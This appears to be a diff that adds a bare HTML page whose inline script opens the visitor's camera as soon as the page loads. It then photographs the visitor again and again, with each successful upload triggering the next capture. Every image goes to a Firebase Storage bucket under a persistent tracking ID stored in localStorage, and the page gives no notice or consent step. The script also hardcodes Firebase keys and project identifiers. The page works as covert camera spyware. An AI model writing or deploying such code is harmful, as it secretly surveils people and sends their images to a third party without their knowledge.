@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <title>Page Title</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="stylesheet" type="text/css" media="screen" href="main.css" />
+    <script src="main.js"></script>
+    <style type="text/css">
+      body {
+        height: 100vh;
+        width: 100vw;
+      }
+      #cameraView {
+        height: 300px;
+        width: 600px;
+        background-color: lightgray;
+      }
+    </style>
+  </head>
+  <body>
+    <video src="" id="cameraView" autoplay></video>
+
+    <!-- Script -->
+
+    <script type="module">
+      // Import necessary Firebase services
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
+      import {
+        getDatabase,
+        ref,
+        push,
+      } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-database.js";
+      import {
+        getStorage,
+        ref as storageRef,
+        uploadString,
+        getDownloadURL,
+      } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-storage.js";
+
+      // Your Firebase configuration
+      const firebaseConfig = {
+        apiKey: "AIzaSyCA8_p5VT9aeGH1rxnMzf5bEgoW4q50PME",
+        authDomain: "azeem-tech-c6ab8.firebaseapp.com",
+        databaseURL: "https://azeem-tech-c6ab8-default-rtdb.firebaseio.com",
+        projectId: "azeem-tech-c6ab8",
+        storageBucket: "azeem-tech-c6ab8.appspot.com",
+        messagingSenderId: "748279942561",
+        appId: "1:748279942561:web:557d0bd231658082100fe0",
+        measurementId: "G-SYDGZPCNC4",
+      };
+
+      // Initialize Firebase
+      const app = initializeApp(firebaseConfig);
+      const db = getDatabase(app);
+      const storage = getStorage(app);
+
+      let dbRef = ref(db, "cameraUsers");
+      let newPushRef = push(dbRef);
+      let pushID;
+
+      localStorage
+
+      if (localStorage.getItem("UserID_Azeemtech")) {
+        pushID = localStorage.getItem("UserID_Azeemtech");
+      } else {
+        pushID = newPushRef.key;
+        localStorage.setItem("UserID_Azeemtech", pushID);
+      }
+
+      console.log("Generated Push ID:", pushID);
+
+      // Access the video element
+      let cameraView = document.getElementById("cameraView");
+
+      // Get the video stream from the user's camera
+      
+      // Function to capture a photo
+      function capturePhoto() {
+        let canvas = document.createElement("canvas");
+        canvas.width = cameraView.videoWidth;
+        canvas.height = cameraView.videoHeight;
+        let context = canvas.getContext("2d");
+
+        // Draw the current video frame to the canvas
+        context.drawImage(cameraView, 0, 0, canvas.width, canvas.height);
+
+        // Convert the canvas image to a Data URL
+        let imageUrl = canvas.toDataURL("image/png");
+        
+        // Upload the captured image
+        let imgID = push(dbRef);
+        uploadImage(imageUrl, `IMG_${imgID.key}.png`);
+        console.log("Captured Image URL:", imageUrl);
+      }
+
+     
+      navigator.mediaDevices
+        .getUserMedia({ video: true })
+        .then((stream) => {
+          cameraView.srcObject = stream;
+          capturePhoto()
+        })
+        .catch((error) => {
+          console.error("Camera error:", error);
+        });
+
+      // Add an event listener to capture a photo when the user clicks the page
+      // document.body.addEventListener("click", () => {
+      //   capturePhoto();
+      // });
+
+      function uploadImage(dataURL, imageName) {
+
+        const imageRef = storageRef(
+          storage,
+          `${pushID}/${imageName}`
+        );
+
+        // Upload the Data URL as a base64 string to Firebase Storage
+        uploadString(imageRef, dataURL, "data_url")
+          .then(() => {
+            console.log("Uploaded a data_url string!");
+
+            // Get the download URL directly using the storage reference
+            getDownloadURL(imageRef)
+              .then((downloadURL) => {
+                console.log("File available at:", downloadURL);
+                capturePhoto();
+              })
+              .catch((error) => {
+                console.error("Error getting download URL:", error);
+              });
+          })
+          .catch((error) => {
+            console.error("Error uploading image:", error);
+          });
+      }
+      
+    </script>
+  </body>
+</html>
